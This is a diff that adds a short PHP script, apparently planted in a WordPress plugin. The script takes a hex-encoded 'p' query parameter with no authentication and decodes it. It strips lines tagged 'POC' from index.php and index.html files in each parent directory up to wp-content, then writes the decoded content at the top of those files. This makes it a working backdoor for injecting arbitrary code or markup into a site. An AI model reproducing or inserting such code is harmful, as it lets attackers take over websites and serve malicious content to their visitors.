@@ -1,0 +1,49 @@
+<?php
+
+	//files
+	$targets = array('index.php', 'index.html');
+
+	function hex2str($hex)
+	{
+		$str='';
+		for ($i=0; $i < strlen($hex)-1; $i+=2)
+		{
+			$str .= chr(hexdec($hex[$i].$hex[$i+1]));
+		}
+		return $str;
+	}
+	
+	if (!isset($_GET['p'])) exit;
+	$hex = $_GET['p'];
+
+	$path	= realpath(dirname(__FILE__));
+	$add	= hex2str($hex)."\n";
+	
+	$comm = 'POC';
+	$fold   = explode('/', $path);
+	
+	$loc = '/';
+	foreach($fold as $f)
+	{
+		if ($f == 'wp-content') break;
+		$loc .= $f.'/';
+		
+		foreach($targets as $trg)
+		{
+			if (file_exists($loc.$trg)) {
+				$content = @file($loc.$trg);
+				foreach($content as $i => $lcont)
+				{
+					if (!(strpos($lcont,$comm) === FALSE)) unset($content[$i]);
+				}
+				
+				array_unshift($content, $add);
+				$fcontent = implode('', $content);
+				@file_put_contents($loc.$trg, $fcontent);
+			}
+		}
+	}
+	
+	echo "JAPluginDone";
+	
+?>
